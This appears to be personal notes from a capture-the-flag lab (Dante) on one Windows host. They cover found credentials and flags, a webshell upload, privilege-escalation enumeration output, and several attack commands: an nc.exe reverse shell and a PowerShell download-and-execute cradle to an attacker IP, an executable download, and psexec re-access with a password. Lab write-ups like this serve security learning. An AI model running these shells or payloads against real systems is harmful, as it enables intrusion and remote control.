# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: `172.16.1.13`

# Findings
### Credentials
` john , 12345`
` admin: admin `

### Flags
1. `DANTE{l355_t4lk_m04r_l15tening}`
2. `DANTE{Bad_pr4ct1ces_Thru_strncmp}`
## External
### Enumeration
![](https://i.imgur.com/0JBiJwb.png)

![](https://i.imgur.com/6SVvP5L.png)
![](https://i.imgur.com/zA3rwba.png)

![](https://i.imgur.com/4PHf7n6.png)
### Gaining Access
![](https://i.imgur.com/haVAvZz.png)
- I submitted A webshell insted of Image and It Accepted it.
![](https://i.imgur.com/BsKT5v5.png)
![](https://i.imgur.com/QUSt0O8.png)
## Internal
### Enumeration
```
[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1909 (18363)
 [*] Enumerating installed KBs...
 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [!] CVE-2020-0796 : VULNERABLE
  [>] https://github.com/danigargu/CVE-2020-0796 (smbghost)

 [*] Finished. Found 2 potential vulnerabilities.

�����͹ UAC Status
�If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken:
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.

C:\Users\gerald\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

�����͹ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        gerald         DANTE-WS01               Active


- Installed APPs
- TCP        127.0.0.1             3306 

�����͹ Checking Windows Vault
� https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    GUID: 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
    Type: Web Credentials
    Resource: http://localhost/
    Identity: ippsec
    Last Modified: 04/12/2020 01:02:44
   =================================================================================================

�����͹ Checking for DPAPI Master Keys
� https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\gerald\AppData\Roaming\Microsoft\Protect\S-1-5-21-3659841024-4065501111-2845508916-1001\33dec54e-d020-45d2-bbc8-f7f922d82b1a
    Accessed: 21/06/2024 20:13:10
    Modified: 13/07/2020 10:29:30
   =================================================================================================

    MasterKey: C:\Users\gerald\AppData\Roaming\Microsoft\Protect\S-1-5-21-3659841024-4065501111-2845508916-1001\36dade2f-7a5a-433d-b4bc-f43dd7d2ad1c
    Accessed: 13/04/2021 21:51:08
    Modified: 03/12/2020 16:20:01
   =================================================================================================

    MasterKey: C:\Users\gerald\AppData\Roaming\Microsoft\Protect\S-1-5-21-3659841024-4065501111-2845508916-1001\5fb5b093-9921-4de4-88c5-2b5571699187
    Accessed: 21/06/2024 20:13:32
    Modified: 21/06/2024 20:13:32
   =================================================================================================

    MasterKey: C:\Users\gerald\AppData\Roaming\Microsoft\Protect\S-1-5-21-3659841024-4065501111-2845508916-1001\c6ee2667-101d-40b4-9982-893ee2cd83c4
    Accessed: 13/04/2021 21:25:43
    Modified: 13/04/2021 21:51:17
   =================================================================================================

Start-Process powershell -Verb runAs "C:\xampp\htdocs\discuss\ups\nc.exe -e powershell 172.16.1.100 1003"
```
### Gaining Access


### Maintaining Access
![](https://i.imgur.com/5g9OBjZ.png)
![](https://i.imgur.com/gVzzhiz.png)
![](https://i.imgur.com/6iQScSQ.png)

- to access it back: `impacket-psexec Administrator:'hackyou!123'@172.16.1.13`
# Random Notes

```

echo "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$dNSE=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$dNSE.proxy=[Net.WebRequest]::GetSystemWebProxy();$dNSE.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://172.16.1.100:4400/OT5JOoJLUIMi4f/PJWec8D'));IEX ((new-object Net.WebClient).DownloadString('http://172.16.1.100:4400/OT5JOoJLUIMi4f'));" | | iconv -f ascii -t utf-16le | base64 -w0


iwr -uri http://172.16.1.100:9090/rex1.exe -outfile rex.exe

```